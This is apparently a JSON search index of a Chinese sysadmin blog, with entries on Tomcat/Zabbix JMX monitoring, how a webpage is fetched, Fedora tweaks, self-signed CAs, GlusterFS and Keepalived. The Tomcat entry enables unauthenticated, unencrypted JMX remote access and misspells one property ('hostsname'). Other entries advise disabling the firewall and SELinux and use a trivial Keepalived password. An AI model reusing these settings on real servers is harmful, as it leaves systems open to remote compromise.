-Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostsname=10.0.2.20 # tomcat服务器的ip \" zabbix_server 启动并配置 JavaGateway $\u003e vim /opt/zabbix-server/etc/zabbix_server.conf # 282 JavaGateway=10.0.2.11 JavaGatewayPort=10052 StartJavaPollers=5 $\u003e systemctl restart zabbix_server.service $\u003e /opt/zabbix-server/sbin/zabbix_java/startup.sh # 前端添加jmx 监控, 完成 优化 根据文献记载，一个tomcat一般只部署一个站点, 清理webbapps下所有目录，新建ROOT将项目内容直接放到里面去，然后nginx反代即可 # 需要指定Host 等绑定参数，不然有坑 location / { proxy_pass http://jpress_server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } 具体优化见 常用web环境优化 ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:0:0","tags":["linux","优化","tomcat"],"title":"Tomcat安装及优化","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","整理收集"],"content":"访问一个网页的全过程","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":" 引言 思考：请尽可能详细的写出从浏览器地址栏输入https://www.taobao.com之后到返回首页内容的整个过程中的交互细节。 这是我刚开始工作的时候，leader给的思考题，当时也是花了好多功夫才总结出来的，所以想记录一下。这个题目我在校招的时候也被问过，算是很重要的知识点 了。 1. 用户从浏览器打开网页的过程 DNS解析 当将网页输入到浏览器会车后，浏览器会首先查询本地缓存和hosts文件，如果里面都没有这个域名的话，将会通过网卡配置的dns服务器(localdns)进行查找,如果localdns里面也查询不到这个域名服务器，localdns将会把这个请求发送到全球13台DNS根服务器(根服务器只管理顶级域名，又称为一级域名)进行查询 TCP三次握手建立连接 HTTP请求报文处理 请求方法URI协议/版本 请求头(Request Header) 请求正文 网站内部数据(发送、接收)整理响应 HTTP响应报文处理 TCP四次断开 应用层开始 1.1. 在浏览器输入https://www.taobao.com 1.1.1. 浏览器接收url开启网络请求线程,URL包括以下部分 protocol：协议头https host：主机域名www.taobao.com port：端口号(默认) path：无 query：无 fragment：无 1.1.2. https协议 https协议是基于http协议开发的,是比http更安全的协议,在http协议的基础上增加了SSL/TLS加密 1.2. DNS获取IP地址 一般，如果平台配备了负载均衡的话，前一步DNS解析获得的IP地址应该是Nginx负载均衡服务器的IP地址。所以，之后会将我们的网页请求发送到了Nginx负载均衡服务器上。 Nginx根据我们设定的分配算法和规则，选择一台后端的真实Web服务器，与之建立TCP连接、并转发我们浏览器发出去的网页请求。 1.2.1. 寻找IP地址过程: 请求一旦发起，浏览器首先要做的事情就是解析这个域名，一般来说，浏览器会首先查看本地硬盘的 hosts 文件，看看其中有没有和这个域名对应的规则，如果有的话就直接使用 hosts 文件里面的 ip 地址。 如果在本地的 hosts 文件没有能够找到对应的 ip 地址，浏览器会发出一个 DNS请求到本地DNS服务器 。本地DNS服务器一般都是你的网络接入服务器商提供，比如中国电信，中国移动。 查询你输入的网址的DNS请求到达本地DNS服务器之后，本地DNS服务器会首先查询它的缓存记录，如果缓存中有此条记录，就可以直接返回结果，此过程是递归的方式进行查询。如果没有，本地DNS服务器还要向DNS根服务器进行查询。 DNS根服务器没有记录具体的域名和IP地址的对应关系，于是告诉本地DNS服务器，你可以到域服务器上去继续查询，并给出域服务器的地址。这种过程是迭代的过程。 本地DNS服务器继续向域服务器发出请求，在这个例子中，请求的对象是.com域服务器。.com域服务器收到请求之后，也不会直接返回域名和IP地址的对应关系，而是告诉本地DNS服务器，你的域名的解析服务器的地址。 最后，本地DNS服务器向域名的解析服务器发出请求，这时就能收到一个域名和IP地址对应关系，本地DNS服务器不仅要把IP地址返回给用户电脑，还要把这个对应关系保存在缓存中，以备下次别的用户查询时，可以直接返回结果，加快网络访问。如果url里不包含端口号，则会使用该协议的默认端口号。 1.3. 根据HTTP协议生成HTTP请求报文 HTTP报文一般包括了： 请求/响应行，请求/响应头部，空白行，请求体/响应数据。 1.3.1. 请求 【请 求 行】请求方法 空格 请求资源地址(URI、无域名) 空格 HTTP版本 空格 CRLF(换行符) 【请 求 头】标识: 内容 CRLF(换行符) 【空 一 行】(表示请求头结束) 【请求 主体】（即请求正文，用户的主要数据。POST方式时使用，GET无请求主体） 1.3.2. 响应 【响 应 行】HTTP版本 空格 状态码 空格 状态码的文本描述 空格 CRLF(换行符) 【响 应 头】标识:内容 CRLF(换行符) 【空 一 行】(表示响应头结束) 【响应 主体】所谓响应主体，就是服务器返回的资源的内容。即整个HTML文件。 1.4. TLS进行加密,提供保密性和数据完整性 TLS是对SSL的改进,目标是为了更安全,可以确保数据发送到正确的客户端和服务器,途中防止被窃取,并且数据在过程中不发生改变. TLS 使用“消息认证代码的密钥散列法”，当记录在开放的网络（如因特网）上传送时，该代码确保记录不会被变更。 增强的伪随机功能（PRF）：PRF生成密钥数据。在TLS中，PRF使用两种散列算法保证其安全性。如果任一算法暴露了，只要第二种算法未暴露，数据仍然是安全的。 TLS提供更多的特定和附加警报，以指示任一会话端点检测到的问题。 TLS协商过程 客户端发出请求(ClientHello)，客户端表达想跟服务端安全进行通话 服务器回应 (ServerHello)，服务器收到并返回给客户端证书,拿去验证身份 客户端回应(Certificate Verify),客户端验证证书的真实性,如果有误发出警告并断开链接,如果无误,客户端就会取出公钥并把秘密消息加密发送至服务端 服务端最后回应(Server Finish),用私钥将客户端消息解密,然后处理并加密发给客户端,这时加密通道已经建立成功了.双方可以进行加密传输了. 应用层结束 在应用层将要发送的数据内容形成了应用层的报文data,发送到传输层 传输层开始 1.5. TCP三次握手 握手过程: 第一次握手：客户端给服务端发一个 SYN 报文，并指明客户端的初始化序列号 ISN©。此时客户端处于 SYN_Send状态。 第二次握手：服务器收到客户端的 SYN 报文之后，会以自己的 SYN 报文作为应答，并且也是指定了自己的初始化序列号 ISN(s)，同时会把客户端的 ISN + 1 作为 ACK 的值，表示自己已经收到了客户端的 SYN，此时服务器处于 SYN_REVD的状态 第三次握手：客户端收到 SYN 报文之后，会发送一个 ACK 报文，当然，也是一样把服务器的 ISN + 1 作为 ACK 的值，表示已经收到了服务端的 SYN 报文，此时客户端处于 establised状态。 服务器收到 ACK 报文之后，也处于 establised 状态，此时，双方以建立起了链接。 通俗点说就是: 客户端想要跟服务端进行通信,首先告知服务端一声:“我想跟你通信” 服务端收到客户端的连接请求,回一个确认消息:“我知道了,你现在能连吗?” 客户端收到服务端的确认消息后,礼貌的告知一下服务端:“好的,咱们开始通信吧” 传输层结束 这些数据通过传输层发送，比如tcp协议。所以它们会被送到传输层处理，在这里报文打上了传输头的包头，主要包含端口号，以及tcp的各种制信息，这些信息是直接得到的，因为接口中需要指定端口。这样就组成了tcp的数据传送单位segment。tcp是一种端到端的协议，利用这些信息，比如tcp首部中的序号确认序号，根据这些数字，发送的一方不断的进行发送等待确认，发送一个数据段后，会开启一个计数器，只有当收到确认后才会发送下一个，如果超过计数时间仍未收到确认则进行重发，在接受端如果收到错误数据，则将其丢弃，这将导致发送端超时重发。通过tcp协议，控制了数据包的发送序列的产生，不断的调整发送序列，实现流控和数据完整。然后待发送的数据段发送到网络层。 网络层开始 1.6. IP寻址 网络层开始负责将这样的数据包在网络上传输，如何穿过路由器，最终到达目的地址。在这里，根据目的ip地址，就需要查找下一跳路由的地址。首先在本机，要查找本机的路由表。 查找过程是这样的: 根据目的地址，得到目的网络号，如果处在同一个内网，则可以直接发送。 如果不是，则查询路由表，找到一个路由。 如果找不到明确的路由，此时在路由表中还会有默认网关，也可称为缺省网关，IP用缺省的网关地址将一个数据传送给下一个指定的路由器，所以网关也可能是路由器，也可能只是内网向特定路由器传输数据的网关。 路由器收到数据后，它再次为远程主机或网络查询路由，若还未找到路由，该数据包将发送到该路由器的缺省网关地址。而数据包中包含一个最大路由跳数，如果超过这个跳数，就会丢弃数据包，这样可以防止无限传递。路由器收到数据包后，只会查看网络层的包裹数据，目的ip。所以说它是工作在网络层，传输层的数据对它来说则是透明的。 如果上面这些步骤都没有成功，那么该数据报就不能被传送。如果不能传送的数据报来自本机，那么一般会向生成数据报的应用程序返回一个“主机不可达”或 “网络不可达”的错误。 关于NAT转换 如果是在局域网中,每台电脑都有自己的私网IP,在对外传输的时候,会经过NAT转换,改成路由器的公网IP 1.7. ARP协议获取MAC地址 ARP协议是将IP地址映射成MAC地址的,由于是IP协议使用了ARP协议,因此通常把ARP协议划归为网络层,但是ARP协议的用途是为了从网络层使用的IP地址解析出在数据链路层使用的MAC地址. 获取MAC地址过程: 主机生成一个具有目的IP地址(默认网关)的ARP查询报文,将该ARP报文放置在一个具有广播目的地址(例如FF:FF:FF:FF:FF:FF:FF)的以太网帧中,并向交换机发送该以太网帧,交换机将该帧交付给所有连接的设备,包括网关路由器。 网关路由器在接口上收到包含该ARP查询报文的帧,发现A","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/:0:0","tags":["linux"],"title":"访问一个网页的全过程","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","整理收集"],"content":"日志切割工具Logrotate详解","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/","tags":["linux","日志"],"title":"日志切割工具Logrotate详解","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","整理收集"],"content":" Logrotate 程序是一个日志文件管理工具。用于分割日志文件，压缩转存、删除旧的日志文件，并创建新的日志文件 https://cloud.tencent.com/developer/article/1681716 ","date":"2022-06-22","objectID":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/:0:0","tags":["linux","日志"],"title":"日志切割工具Logrotate详解","uri":"/posts/linux/%E6%97%A5%E5%BF%97%E5%88%87%E5%89%B2%E5%B7%A5%E5%85%B7logrotate%E8%AF%A6%E8%A7%A3/"},{"categories":["linux","那些有用没用的"],"content":"Fedora优化","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/","tags":["linux","fedora"],"title":"Fedora优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","那些有用没用的"],"content":" 前言 以下的一些优化应该是我还在用fedora26的时候记录的，虽然现在我已经都更新到33了，不过这些优化还是有点用的，可以参考着改, 后续遇到的问题我也在慢慢更新上来。 目前已更新到fedora 38 2. 安装鼠标右键“在终端中打开”，33中默认好像已经有了 [root@cxd ~]$ sudo dnf install nautilus-open-terminal 3. 安装 GNOME-tweak-tool $\u003e sudo dnf install gnome-tweak-tool ## 扩展库安装 ### Dash to dock (可选:Dash to panel) ### system-monitor ### Recent(Item)s (fedora 38 已无，暂为找到替代方案) ### Topicons plus git(fedora 38 已无,切换为 AppIndicator and KStatusNotifierItem Support) ### Drop down terminal(fedora 38 已无) ### Clipboard indicator(可以切换为 Clipboard History 或者 Pano 、 或者使用 copyq (推荐) ) ### Todo.txt ### Bottompanel(将任务栏放到下面,与windows list 和 Dash to panel 扩展冲突) ## 扩展字体修正 # Drop down terminal: FONT_NAME_SETTING_KEY == monospace-font-name # org.gnome.desktop.interface # gsettings set org.gnome.desktop.interface monospace-font-name 'Source Code Pro 15' 4. 安装一些好用的额外工具和包 $\u003e sudo dnf install flameshot # 火焰截图,很好用,拥有win下面截图软件的一些功能 $\u003e sudo dnf install audacity # 声音处理工具,实际好像没啥用 $\u003e sudo dnf install peek # gif 图像录制工具 $\u003e sudo dnf install inkscape # 矢量图画画工具 $\u003e sudo dnf install sleek # todo 任务(https://github.com/ransome1/sleek) $\u003e sudo dnf install libreoffice-langpack-zh-Hans.x86_64 # libreoffice的中文语言包 $\u003e sudo pip3 install bpython # https://flathub.org/zh-Hans/apps/io.github.flattool.Warehouse # flatpak 管理工具 # https://flathub.org/zh-Hans/apps/com.github.tchx84.Flatseal # flatpak 权限管理工具 # https://flathub.org/zh-Hans/apps/io.github.giantpinkrobots.flatsweep # flatpak 卸载残留清理工具(fedora38下运行不稳定) 5. 安装ficx输入法 https://blog.csdn.net/qq23425352/article/details/107379335 $\u003e # fcitx $\u003e sudo dnf install fcitx fcitx-{ui-light,qt{4,5},table,gtk{2,3},table-chinese,configtool,sunpinyin} # fcitx5 $\u003e sudo dnf install fcitx5 fcitx5-{qt{5,6},configtool,gtk{2,3,4},lua,rime,table-extra,table-other,chinese-addons} $\u003e sudo vim /etc/profile.d/fcitx.sh export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" # 开机启动项 添加fcitx ，然后重启 6. fedroa下多jdk切换方案 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [cxd@0x5c0f opt]$ sudo update-alternatives --config java 共有 3 个提供“java”的程序。 选项 命令 ----------------------------------------------- * 1 java-1.8.0-openjdk.x86_64 (/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-10.b14.fc25.x86_64/jre/bin/java) 2 /opt/jdk1.8.0_121/bin/java 按 Enter 保留当前选项[+]，或者键入选项编号：2 7. 系统bug优化-显卡 此方法解决了nouveau 对于nvidia显卡支持不好从而导致了gnome在锁屏状态卡死,从而无法登陆桌面,只能重启操作系统 (双显卡电脑). # 1. 修改文件 /etc/default/grub # 2. 修改行 GRUB_CMDLINE_LINUX 在末尾添加 nouveau.modeset=0 # 3. 更新gurb: grub2-mkconfig -o /boot/grub2/grub.cfg # 4. 重启 8. 系统bug优化-蓝牙 这也可能不是一个bug,具体问题是蓝牙鼠标连接后一段时间未使用电脑和鼠标,蓝牙将会自动被断开,但系统仍然显示连接中,手动断开后也无法在进行连接,只能删除原有连接然后重新配对, 多次查询相关无果后对蓝牙的相关配置文件进行检查,发现系统设置里面对于蓝牙有DiscoverableTimeout这么一个参数,此参数作用是设置蓝牙保持发现的最长时间,默认180秒. 修改此参数后问题解决. # 解决方案 # 1. 修改配置文件 /etc/bluetooth/main.conf # 2. 修改 DiscoverableTimeout=0 # 另: fedora官网wiki提供了另一种解决方案,说的大概是大部分的自动断开都是因为蓝牙服务未以守护进程方式运行,解决方案是 ## https://fedoraproject.org/wiki/How_to_debug_Bluetooth_problems#Simple_debugging # 1. 修改配置文件 /usr/lib/systemd/system/bluetooth.service # 2. 修改参数 ExecStart 在末尾添加 -d # 重启 systemctl restart bluetooth.service 9. systemd 添加后无权限启动问题 .service: Failed to execute command: Permission denied 此问题实际上是由于selinux开启enforcing(强制模式)导致的,一般的fedora用户应该都不会去关闭selinux吧，只有在服务器上为了方便才会去关闭,解决这个问题的方法有两种，一种是关闭selinux,或者将selinux设置为permissive(宽容模式),第二种就是直接修正上下文权限为bin_t,这个具体可以看下系统中其他可执行文件的上下文权限是什么(ls -Z),修改命令是chcon -t bin_t \u003cbinaryfile\u003e,另外.service命名在systemd配置目录中了，systemctl status时却看不到,也是这个问题，这个问题也是我直接复制v2ray的时候发现的，这儿记录下. 10. fedora 32 启用 docker https://linux.cn/article-12433-1.html 11. fedora 33 下修改Wayland桌面为","date":"2022-02-28","objectID":"/posts/other/fedora%E4%BC%98%E5%8C%96/:0:0","tags":["linux","fedora"],"title":"Fedora优化","uri":"/posts/other/fedora%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"自签证书的生成及可信列表的添加","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"1. 正文 1.1. 生成 CA 私钥 # 此处需要让你设置一个密码(好像可以直接忽略密码,但不晓得怎么操作) ## openssl genrsa -out ca.key 4096 openssl genrsa -des3 -out ca.key 4096 # 移除出私钥密码 openssl rsa -in ca.key -out ca.key 1.2. 生成 ca 证书 subj 参数说明 字段 字段含义 示例 /C= Country 国家 CN /ST= State or Province 省 Chongqing /L= Location or City 城市 Shapingba /O= Organization 组织或企业 0x5c0f /OU= Organization Unit 部门 ops /CN= Common Name 域名或IP blog.0x5c0f.cc openssl req -utf8 -x509 -new -nodes -key ca.key -sha512 -days 18250 -out ca.pem -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f/emailAddress=mail@0x5c0f.cc\" 1.3. 生成证书私钥 openssl genrsa -out server.key 4096 1.4. 生成域名签名 openssl req -new -key server.key -out server.csr -subj \"/C=CN/ST=CQ/O=0x5c0f/CN=0x5c0f.cc/emailAddress=mail@0x5c0f.cc\" 1.5. 创建扩展 后续有新域名,直接加入进去即可 cat \u003e server.ext \u003c\u003cEOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth, clientAuth, codeSigning subjectAltName = @alt_names [alt_names] DNS.1 = *.0x5c0f.cc DNS.2 = *.51ac.cc DNS.3 = localhost IP.1 = 127.0.0.1 EOF 1.6. 生成域名证书 openssl x509 -req -in server.csr -CA ca.pem -CAkey ca.key -CAcreateserial -out server.crt -days 1825 -sha512 -extfile server.ext 1.7. 可信列表添加 1.7.1. linux https://qastack.cn/unix/90450/adding-a-self-signed-certificate-to-the-trusted-list 以fedroa32为例 sudo cp -v ca.pem /etc/pki/ca-trust/source/anchors/ca.pem sudo update-ca-trust 1.7.2. windows 以win 10为例 win + R 打开运行窗口, 键入 mmc 然后回车, 选择 文件-添加/删除单元节点。选择证书-添加，打开选项卡自行判断选择，完成即可。 上述完成后，在mmc控制台中就可以看到证书节点, 展开证书-受信任的根证书颁发机构，选择其下面证书,然后右键 所有任务-导入,导入生成的ca.pem即可，退出时会提示存储控制台的信息，可以忽略 ","date":"2021-07-23","objectID":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/:0:0","tags":["linux","解决方案"],"title":"自签证书的生成及可信列表的添加","uri":"/posts/other/%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6%E7%9A%84%E7%94%9F%E6%88%90%E5%8F%8A%E5%8F%AF%E4%BF%A1%E5%88%97%E8%A1%A8%E7%9A%84%E6%B7%BB%E5%8A%A0/"},{"categories":["linux","运维记事"],"content":"分布式文件系统_GlusterFS","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"1. 前言 分布式文件存储 实验环境： 1. centos7.x 2台 (node11，node12) 2. glusterfs 4.1.6 2. 安装 2.1. 基础环境配置 关闭防火墙 关闭selinux 统一主机名称(保证唯一主机名) 添加hosts解析 2.2. 安装 每个节点机器均需要安装并启动： [root@node11 ~]# yum install epel-release # epel 源 [root@node11 ~]# yum install centos-release-gluster40 # 安装gluster 源 [root@node11 ~]# yum install glusterfs-server glusterfs-geo-replication #安装gluster [root@node11 ~]# glusterfs -V # 查看版本信息 glusterfs 4.1.6 Repository revision: git://git.gluster.org/glusterfs.git Copyright (c) 2006-2016 Red Hat, Inc. \u003chttps://www.gluster.org/\u003e GlusterFS comes with ABSOLUTELY NO WARRANTY. It is licensed to you under your choice of the GNU Lesser General Public License, version 3 or any later version (LGPLv3 or later), or the GNU General Public License, version 2 (GPLv2), in all cases as published by the Free Software Foundation. [root@node11 ~]# systemctl start glusterd # 启动 [root@node11 ~]# systemctl enable glusterd # 加入开机启动项 3. 配置 3.1. 将存储主机加入存储信任池 # 将存储主机加入存储信任池，任意一个节点添加非当前节点的节点即可 # 如：node11,node12,node13(主机别名) ,在node11 添加 node12,node13。或在node12 添加 node11,node13 ... [root@node11 ~]# gluster peer probe node12 peer probe: success. 3.2. 查看状态 [root@node11 ~]# gluster peer status Number of Peers: 1 Hostname: node12 Uuid: 1bf6ec90-7130-48db-86e8-acb38abc6b40 State: Peer in Cluster (Connected) ############ [root@node12 ~]# gluster peer status Number of Peers: 1 Hostname: node11 Uuid: 4f2833b8-a117-4540-8e29-691a6849737e State: Peer in Cluster (Connected) 3.3. 创建volume 卷 创建volume 及其他操作 分布卷(Distributed)： 文件通过hash算法随机的分布到有bricks组成的卷上,是文件分散存储 复制卷(Replicated) : 类似raid1, replica 数必须登录volume中birck所包含的存储服务器数，可高可用 条带卷(Striped) : 类似raid0，stripe数必须等于volume中brick所包含的存储服务器数，文件被分成数据块，以round robin的方式存储在bricks中，并发粒度是数据块，大文件性能好。 分布式卷、分布式复制卷(主要使用)、分布式条带卷(不建议使用)即组合 3.3.1. 分布式挂载卷 类似raid0,但是是文件分散存储，而不是文件被拆分为块分散存储 3.3.1.1. 创建 # 创建挂载目录(这个目录就是数据盘的挂载目录,我但服务器总共挂载了6块盘，用来测试) [root@node11 ~]# mkdir -p /data/node1{1..3} /data/node{1..3}1 ## store: 相当于逻辑卷的那个别名 ## node11、node12 就是主机名称,也可以是ip ## /data/node1 是挂载的目录，应该是相当于nfs远程挂载的本地路径(此处指的是存储磁盘，建议每个节点服务器的存储名称一致，方便区分) [root@node11 ~]# gluster volume create store1 node11:/data/node1 node12:/data/node1 force # 创建分布卷 volume create: store1: success: please start the volume to access data 3.3.1.2. 启动 [root@node11 ~]# gluster volume start store1 # 启动卷 volume start: store1: success 3.3.1.3. 查看 [root@node11 ~]# gluster volume info store1 # 查看卷(node1) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### [root@node12 ~]# gluster volume info store1 # 查看卷(node2) Volume Name: store1 Type: Distribute Volume ID: 686e4c24-bded-4552-8c08-259b9e1c74b6 Status: Started Snapshot Count: 0 Number of Bricks: 2 Transport-type: tcp Bricks: Brick1: node11:/data/node1 Brick2: node12:/data/node1 Options Reconfigured: transport.address-family: inet nfs.disable: on #################################################### 3.3.1.4. 挂载 /etc/fstab: localhost:/store1 /mnt glusterfs defaults,_netdev 0 0 # 以glusterfs的形式挂载(node1可以是任意一个节点的名称或ip，另外还有一种是nfs形式挂载，但该方法挂载未测试成功过， # 此处就不说明了，如果有遇到过同样问题并解决了，欢迎指出) [root@node1 ~]# mount -t glusterfs node1:/store1 /mnt [root@node1 ~]# df -h # 我是一个200g的盘，一个20G的盘，合并卷后可以看到总共220G，因为我是两个盘下面的一个目录来做的实验，所有存在较大的使用空间(实际空盘创建后只会有卷的缓存目录存在,大概几十M左右) Filesystem Size Used Avail Use% Mounted on ## 省略 ## node1:/store 218G 11G 207G 6% /mnt # 在挂载目录下创建多个(如：100个)测试文件，那么/mnt(即挂载目录)文件总个数100，实际node1的/data/node1目录90个，node2的/data/node1目录10个， # 他是通过hash算法分配文件存放位置的，以上仅是我个人的测试数据结果 3.3.2. 分布式复制卷 近似raid1： 3.3.2.1. 创建 [root@node1 ~]# mkdir /data/node2 # 和分布卷描述一样，假装他是一个独立的盘，用来测试的 # replica 2: 代表复制卷的个数，这个值需要和后面node节点配置的节点个数一致 [root@node1 ~]# gluster volume create store2 replica 2 node1:/data/node2 node2:/data/node2 force volume create: store2: success: please start the volume to access dat","date":"2021-03-23","objectID":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/:0:0","tags":["linux","glusterfs"],"title":"分布式文件系统_GlusterFS","uri":"/posts/linux/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F_glusterfs/"},{"categories":["linux","运维记事"],"content":"Keepalive安装配置","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"安装前需检查反项代理是否正常 yum install keepalived 配置文件说明 /etc/keepalived/keepalived.conf 主备节点配置基本一致,需修改的仅有 router_id , state ，priority # GLOBAL CONFIGURATION # 全局配置 仅保留router_id 即可, router_id 为高可用集群成员ID,ID 唯一 # VRRPD CONFIGURATION # vrrpd 配置 vrrp_instance VI_1 { # 定义实例信息，同主备节点实例标识相同(唯一) state MASTER # 定义实例中主备状态角色(MASTER/BACKUP),仅为标识而已 interface eth1 # 设置主备服务器虚拟ip放置网卡位置 virtual_router_id 51 # 虚拟路由ID标识，不同实例不同，各个主备节点相同(0-255) priority 100 # 设置抢占优先级，数值越大越优先(1-254) advert_int 1 # 主备通讯时间间隔(s) authentication { # 主备间通过认证建立连接 auth_type PASS auth_pass 1111 } virtual_ipaddress { # 定义主备服务器之间使用的虚拟IP地址信息(VIP)，一般来说一个实例对应一个服务，一个服务监听配置的固定VIP 192.16.10.5/24 dev eth1 label eth1:1 } } # LVS CONFIGURATION # 相当于nginx的部分 脑裂：只要备服务器收不到主的组播包，备就会成为主,而主资源未释放 原因 防火墙 多节点间的网络出现故障 virtual_router_id 配置数值不正确 解决方案 一般来说,只要备节点出现VIP就表示不正常，但也有可能是正常的主备切换，如果不是正常的切换， 那么可能是当前节点故障或者当前节点与主节点的通信问题，可以建立一个脚本周期性检查当前节点 与网关的连接性，不通，则应该是自身问题(写个循环ping网关，不通关闭keepalive，通过打开keepalive) 建立nginx与keepalived的关联 nginx 存活检测(示例，实际可能需要更为详细的检测脚本) ，完成后需要修正keepalive.service在nginx.service后启动 #!/bin/bash systemctl is-active nginx.service \u003e\u0026 /dev/null || { systemctl stop keepalived.service } 修改配置 /etc/keepalived/keepalived.conf vrrp_script check_web { # 函数名(需放到实例与全局之间) script \"/opt/sh/check_nginx_status.sh\" # 监控脚本(需有执行权限) interval 2 # 检查时间间隔(s) # weight 2 # 用于与执行结果判断而调整优先级的 } track_script { # 调用配置的函数脚本（放到实例配置里面） check_web } 双主(或互为主备) 实现就是在两个节点中在添加一个实例，修改state，priority，和VIP ","date":"2020-11-19","objectID":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","keepalive"],"title":"Keepalive安装配置","uri":"/posts/linux/keepalive%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Chroot系统,用于限制sftp的根目录权限","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"以下是一片草稿，真的真的是我自己记录的。但是！我现在自己也看不懂了，我真是栓Q了，好像多了一个chroot初始没啥用 chroot系统 正常来说针对于文件共享的sftp应该是以用户为单位来做的,但这儿我却用的是组,这个其实是我测试用用户来做从来没有成功过，只能被迫用组 #!/bin/bash ################################################# # author 0x5c0f # date 2020-12-04 # email mail@0x5c0f.cc # web blog.0x5c0f.cc # version 1.0.0 # last update 2021-04-21 # descript Use : ./chroot.init.sh ################################################# 